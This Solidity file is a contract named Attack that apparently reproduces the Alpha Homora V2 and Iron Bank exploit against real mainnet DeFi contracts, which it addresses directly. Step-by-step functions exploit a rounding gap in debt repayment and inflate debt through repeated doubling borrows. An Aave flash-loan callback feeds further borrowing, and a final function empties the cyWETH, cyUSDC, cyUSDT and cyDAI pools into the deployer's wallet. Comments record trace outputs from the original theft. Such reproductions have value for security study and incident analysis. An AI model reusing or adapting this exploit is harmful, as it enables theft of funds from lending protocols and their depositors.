// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./interface/IHomoraBank.sol";
import "./interface/IUniswapRouter.sol";
import "./interface/IUniswapV2Pair.sol";
import "./interface/IIronBank.sol";
import "./interface/ICurve.sol";

import "./interface/IERC20.sol";
import "./interface/IWERC20.sol";
import "./interface/CERC20.sol";

import "./interface/IAAVE.sol";
import "./interface/IWETH.sol";

import "hardhat/console.sol";

contract Attack {
    address admin;

    IHomoraBank public homorabank;
    IUniswapRouter public uniSwapRouter;
    IUniswapV2Pair public uniswapPair;
    IIronBank public ironBank;

    ICurve public curve;
    ICurve public curve_aDAI_Pool;

    IERC20 public a3CRVT;
    IWETH public wETH;

    IAAVE public aaveLendingPoolV2;
    IWERC20 public werc20;

    IERC20 public uni;
    IERC20 public usdc;
    IERC20 public sUSD;
    IERC20 public dai;
    IERC20 public usdt;

    CERC20 public cySUSD;
    CERC20 public cyUSDC;
    CERC20 public cyUSDT;
    CERC20 public cyDAI;
    CERC20 public cyWETH;

    /* 
        cream finance comptroller = 0xAB1c342C7bf5Ec5F02ADEA1c2270670bCa144CbB
        cToken implementation = 0x2aC63723a576f89b628D514Ff671300801dc1702
     */

    constructor() {
        admin = msg.sender;
        homorabank = IHomoraBank(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb);
        uniSwapRouter = IUniswapRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapPair = IUniswapV2Pair(
            0xd3d2E2692501A5c9Ca623199D38826e513033a17
        );
        ironBank = IIronBank(0xAB1c342C7bf5Ec5F02ADEA1c2270670bCa144CbB); // cream finance comptroller

        curve = ICurve(0xA5407eAE9Ba41422680e2e00537571bcC53efBfD);
        curve_aDAI_Pool = ICurve(0xDeBF20617708857ebe4F679508E7b7863a8A8EeE);
        a3CRVT = IERC20(0xFd2a8fA60Abd58Efe3EeE34dd494cD491dC14900);

        aaveLendingPoolV2 = IAAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

        wETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

        werc20 = IWERC20(0xe28D9dF7718b0b5Ba69E01073fE82254a9eD2F98);

        uni = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
        usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        sUSD = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
        dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

        cySUSD = CERC20(0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8);
        cyUSDC = CERC20(0x76Eb2FE28b36B3ee97F3Adae0C69606eeDB2A37c);
        cyUSDT = CERC20(0x48759F220ED983dB51fA7A8C0D2AAb8f3ce4166a);
        cyDAI = CERC20(0x8e595470Ed749b85C6F7669de83EAe304C2ec68F);
        cyWETH = CERC20(0x41c84c0e2EE0b740Cf0d31F63f3B6F627DC6b393);
    }

    receive() external payable {}

    fallback() external {}

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        return
            bytes4(
                keccak256(
                    "onERC1155Received(address,address,uint256,uint256,bytes)"
                )
            );
    }

    // send 1.5 ETH to call this func
    function attack2() external payable {
        // using uniswap to swap
        // uniswap router address = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d，value = 0.5 ETH
        address[] memory tokens = new address[](2);
        tokens[0] = address(wETH);
        tokens[1] = address(uni);

        uniSwapRouter.swapExactETHForTokens{value: 500000000000000000}(
            1,
            tokens,
            address(this),
            1613195981
        );

        // approve uniswap router
        uni.approve(address(uniSwapRouter), type(uint256).max);
        uint256 balance = uni.balanceOf(address(this));

        // add liquidity
        // function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline)
        // generate 2.265302 LP token
        uniSwapRouter.addLiquidityETH{value: 500000000000000000}(
            address(uni),
            39956169435440238768,
            1,
            1,
            address(this),
            1613195981
        );

        // enter markets in creamFinance
        /* 
            cySUSD = 0x4e3a36a633f63aee0ab57b5054ec78867cb3c0b8 
            cyDai = 0x8e595470Ed749b85C6F7669de83EAe304C2ec68F
            cyWETH = 0x41c84c0e2ee0b740cf0d31f63f3b6f627dc6b393
            cyUSDT = 0x48759F220ED983dB51fA7A8C0D2AAb8f3ce4166a
            cyUSDC = 0x76Eb2FE28b36B3ee97F3Adae0C69606eeDB2A37c
        */

        address[] memory enterTokens = new address[](5);
        enterTokens[0] = 0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8;
        enterTokens[1] = 0x8e595470Ed749b85C6F7669de83EAe304C2ec68F;
        enterTokens[2] = 0x41c84c0e2EE0b740Cf0d31F63f3B6F627DC6b393;
        enterTokens[3] = 0x48759F220ED983dB51fA7A8C0D2AAb8f3ce4166a;
        enterTokens[4] = 0x76Eb2FE28b36B3ee97F3Adae0C69606eeDB2A37c;

        ironBank.enterMarkets(enterTokens);

        // curve = 0xa5407eae9ba41422680e2e00537571bcc53efbfd
        usdc.approve(address(curve), type(uint256).max);
        sUSD.approve(address(curve), type(uint256).max);
        dai.approve(address(curve_aDAI_Pool), type(uint256).max);
        usdt.approve(address(curve_aDAI_Pool), type(uint256).max);

        usdc.approve(address(curve_aDAI_Pool), type(uint256).max);
        usdc.approve(address(aaveLendingPoolV2), type(uint256).max);
        sUSD.approve(address(cySUSD), type(uint256).max);
        sUSD.approve(address(homorabank), type(uint256).max);

        // swap ETH to sUSD， then have sUSD 912.639353999928927702
        address[] memory swapBackTokens = new address[](2);
        swapBackTokens[0] = address(wETH);
        swapBackTokens[1] = address(sUSD);

        uniSwapRouter.swapExactETHForTokens{value: 500000000000000000}(
            1,
            swapBackTokens,
            address(this),
            1613195981
        );

        uint256 amount = sUSD.balanceOf(address(this));

        // using sUSD to mint to get cySUSD
        // amount = 894.386566919930349147     差額：18 sUS = 18 * 1e18
        cySUSD.mint(amount - 18 * 1e18);
    }

    function execute3(uint256 _amount) external {
        // POSITION_ID = 883
        uint256 positionId = homorabank.POSITION_ID();

        // borrow sUSD from homerabank to get the share
        // 0x57ab1ec28d129707052df4df418d58a2d46d5f51 =  sUSD , amount = 1000000000000000000000
        homorabank.borrow(address(sUSD), 1000000000000000000000);

        // amount = 2265302661394052593
        uint256 amount = uniswapPair.balanceOf(address(this));
        uniswapPair.approve(address(werc20), amount);

        // use UNISWAP lp token to mint erc1155
        werc20.mint(address(uniswapPair), amount);

        werc20.setApprovalForAll(address(homorabank), true);

        //function putCollateral(address collToken, uint256 collId, uint256 amountCall)
        homorabank.putCollateral(
            address(werc20), // WERC20
            1209299932290980665713177030673858520201944054295,
            amount
        );
    }

    function execute4() external {
        // cal interest，token is sUSD
        homorabank.accrue(address(sUSD));

        // get debts，position id = 883
        // output: tokens[]，debts[1000000098548938710984], 1000.000098548938710984
        (address[] memory tokens, uint256[] memory debts) = homorabank
            .getPositionDebts(883);
        // repay sUSD but only 1000000098548938710983, but debt is 1000000098548938710984
        homorabank.repay(tokens[0], debts[0] - 1);
    }

    function attack5() external {
        homorabank.resolveReserve(address(sUSD));
    }

    function attack6() external {
        bytes memory data = abi.encodeWithSignature(
            "callback_0xf37425b4(uint256),16"
        );
        homorabank.execute(0, address(this), data);
    }

    // amoun = 16
    function execute6(uint256 _time) external {
        /*  
            attack 6
            return (isListed=true, cToken=[cySUSD], reserve=19709787742196, totalDebt=19709787742197, totalShare=1)
            attack 7
            return (isListed=true, cToken=[cySUSD], reserve=19709787742196, totalDebt=1291700649474786895, totalShare=1)
         */
        (
            bool isList,
            address cToken,
            uint256 reserve,
            uint256 totalDebt,
            uint256 totalShare
        ) = homorabank.getBankInfo(address(sUSD));

        // attack 6 borrow 16 times, and deposit 19.54 sUSD to cySUSD
        // attack 7 borrow 10 times, and deposit 1321 sUSD to cySUSD
        for (uint256 i = 0; i < _time; i++) {
            homorabank.borrow(address(sUSD), (totalDebt - 1) * 2**i);
        }

        uint256 amount = sUSD.balanceOf(address(this));
        cySUSD.mint(amount);
    }

    function execute8(uint256 _x, uint256 _amount) external {
        address[] memory assets = new address[](1);
        assets[0] = address(usdc);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = _amount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        bytes memory params = abi.encode(_x);

        // flashloan USDC from AAVE and then call back executeOperation()
        aaveLendingPoolV2.flashLoan(
            address(this),
            assets,
            amounts, // 1800000000000 USDC
            modes,
            address(this),
            params,
            0
        );
    }

    // AAVE flashloan call back
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        //  on curve to exchange from usdc = 1800000 to get sUSD = 1,770,757.56254472419047906
        curve.exchange(1, 3, amounts[0], 0);

        uint256 amount = sUSD.balanceOf(address(this));

        // add collateral, use sUSD = 1770757562544724190479060 to get cySUSD = 176,732,838.7823772
        cySUSD.mint(amount);

        (, , , uint256 totalDebt, ) = homorabank.getBankInfo(address(sUSD));

        sUSD.balanceOf(address(cySUSD)); // 1,773,718.663234649254776192

        uint256 number = abi.decode(params, (uint256));

        for (uint256 i = 0; i < number; i++) {
            uint256 borrowAmount = (totalDebt - 1) * 2**i;
            uint256 poolAmount = sUSD.balanceOf(address(cySUSD));

            if (poolAmount < borrowAmount) {
                if (poolAmount != 0) {
                    borrowAmount = poolAmount;
                } else {
                    uint256 contractBalance = sUSD.balanceOf(address(this));
                    cySUSD.mint(contractBalance);
                    borrowAmount = contractBalance;
                }
            }

            homorabank.borrow(address(sUSD), borrowAmount);
        }

        // change from sUSD = 1,353,123.598883034807914349 to USDC = 1,374,960.726754
        uint256 sUSDAmount = sUSD.balanceOf(address(this));

        curve.exchange(3, 1, sUSDAmount, 0);

        uint256 newAmount = usdc.balanceOf(address(this));

        uint256 aaveBorrowAmount = amounts[0];
        uint256 fee = premiums[0];

        if (newAmount < aaveBorrowAmount + fee) {
            uint256 shortAmount = aaveBorrowAmount + fee - newAmount;
            // borrow 426,659.273246 USDC from CYUSDC
            cyUSDC.borrow(shortAmount);
        }

        (, uint256 liquidity, ) = ironBank.getAccountLiquidity(address(this));

        return true;
    }

    function attack10() external {}

    function attack11() external {
        /**
         * 1. [Wrapped Ether].balanceOf([Iron Bank: cyWETH]) → (13244630331762545750401)
         * [Iron Bank: cyWETH].borrow(borrowAmount=13244630331762545750401) → (0)
         */
        uint256 cyWETH_Amount = wETH.balanceOf(address(cyWETH));
        cyWETH.borrow(cyWETH_Amount);

        /** 2.
         * [Centre: USD Coin].balanceOf(user=[Iron Bank: cyUSDC]) → (3605354889525)
         * [Iron Bank: cyUSDC].borrow(borrowAmount=3605354889525) → (0)
         */

        uint256 cyUSDC_Amount = usdc.balanceOf(address(cyUSDC));
        cyUSDC.borrow(cyUSDC_Amount);

        /**
         * 3. [Tether: USDT Stablecoin].balanceOf(who=[Iron Bank: cyUSDT]) → (5647242107646)
         * [Iron Bank: cyUSDT].borrow(borrowAmount=5647242107646) → (0)
         */
        uint256 cyUSDT_Amount = usdt.balanceOf(address(cyUSDT));
        cyUSDT.borrow(cyUSDT_Amount);

        /**
         * 4. [Dai Stablecoin].balanceOf([Iron Bank: cyDAI]) → (4263138929122643119834654)
         * [Iron Bank: cyDAI].borrow(borrowAmount=4263138929122643119834654) → (0)
         */
        uint256 cyDAI_Amount = dai.balanceOf(address(cyDAI));
        cyDAI.borrow(cyDAI_Amount);

        /**
         * 5. [Synthetix: Proxy sUSD Token].balanceOf(owner=[Cream.Finance: cySUSD Token]) → (0)
         * [Cream.Finance: cySUSD Token].borrow(borrowAmount=0) → (0)
         */
        uint256 cySUSD_Amount = sUSD.balanceOf(address(cySUSD));
        cySUSD.borrow(cySUSD_Amount);

        /**
         * 6. [Synthetix: Proxy sUSD Token].balanceOf(owner=0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (0)
         * [Synthetix: Proxy sUSD Token].transfer(to=[Alpha Homora V2 Exploiter], value=0) → (true)
         */
        uint256 sUSD_Amount = sUSD.balanceOf(address(this));
        sUSD.transfer(msg.sender, sUSD_Amount);

        // add Dai, USDC, USDT liquidity to curve
        /** 7. [Dai Stablecoin].balanceOf(0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (4263138929122643119834654) */

        uint256 dai_Amount = dai.balanceOf(address(this));
        /** 8. [Centre: USD Coin].balanceOf(user=0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (3997921016170) */
        uint256 usdc_Amount = usdc.balanceOf(address(this));

        /**
         * 9. [Tether: USDT Stablecoin].balanceOf(who=0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (5647242107646)
         * [Curve.fi: aDAI/aUSDC/aUSDT Pool].add_liquidity(_amounts=[4263138929122643119834654, 3997921016170, 5647242107646], _min_mint_amount=0, _use_underlying=true) → (13532845885656673015123177)
         */
        uint256 usdt_Amount = usdt.balanceOf(address(this));

        curve_aDAI_Pool.add_liquidity(
            [dai_Amount, usdc_Amount, usdt_Amount],
            0,
            true
        );

        /**
         * 10.[Curve.fi: a3CRV Token].balanceOf(arg0=0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (13532845885656673015123177)
         * [Curve.fi: a3CRV Token].transfer(_to=[Alpha Homora V2 Exploiter], _value=13532845885656673015123177) → (true)
         */
        uint256 a3CRVT_Amount = a3CRVT.balanceOf(address(this));
        // NOTE:change address(this) to msg.sender
        a3CRVT.transfer(msg.sender, a3CRVT_Amount);

        /**
         * 11. [Wrapped Ether].balanceOf(0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (13244630331762545750401)
         * [Wrapped Ether].withdraw(wad=13244630331762545750401) → ()
         * [Alpha Homora V2 Exploiter].fallback[13244.631828688428795676 ETH]() → (0x)
         */

        uint256 wETH_Amount = wETH.balanceOf(address(this));
        wETH.withdraw(wETH_Amount);
        (bool success, ) = admin.call{value: address(this).balance}("");
        require(success, "Receive Failed");
    }
}
